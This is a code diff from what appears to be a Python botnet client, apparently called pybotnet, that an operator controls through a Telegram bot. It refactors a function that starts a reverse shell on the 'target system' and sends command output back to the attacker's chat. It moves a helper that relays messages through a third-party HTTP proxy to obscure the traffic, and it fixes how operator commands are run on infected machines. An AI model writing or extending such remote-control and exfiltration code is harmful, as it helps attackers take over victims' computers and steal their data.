@@ -58,29 +58,15 @@ def is_command(command) -> bool:
     return False
 
 
-# reverse shell codes
-def send_message(text: str):
-    ''' get a text and send message in bot'''
-
-    sender_link = f"https://api.telegram.org/bot{configs.TELEGRAM_TOKEN}/SendMessage?chat_id={configs.ADMIN_CHAT_ID}&text={text}"
-    payload = {"UrlBox": sender_link,
-               "AgentList": "Mozilla Firefox",
-               "VersionsList": "HTTP/1.1",
-               "MethodList": "POST"
-               }
-    response = requests.post(
-        url="https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",
-        data=payload,
-        timeout=4)
-
-    return response
-
-
 def reverse_shell(is_shell, ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger):
     ''' start reverse shell on target system and send response in telegram bot '''
 
-    logger.info("start reverse shell")
+    def send_message(text: str):
+        util.send_message_by_third_party_proxy(
+            text, TELEGRAM_TOKEN=TELEGRAM_TOKEN,
+            ADMIN_CHAT_ID=ADMIN_CHAT_ID, logger=logger)
 
+    logger.info("start reverse shell")
     repeat = 0
     time_out = 500
 
@@ -123,7 +109,10 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
                 '''run command just on this system'''
                 logger.info('delete mac addres and run command ')
                 new_command = ' '.join(split_command(command)[1:])
-                return execute_scripts(new_command, pybotnet_up_time, logger)
+                return execute_scripts(
+                    new_command, pybotnet_up_time, is_shell,
+                    ADMIN_CHAT_ID, TELEGRAM_TOKEN,
+                    previous_update_id, logger)
 
             elif command_name == 'do_sleep':
                 return execute_do_sleep(command, logger)
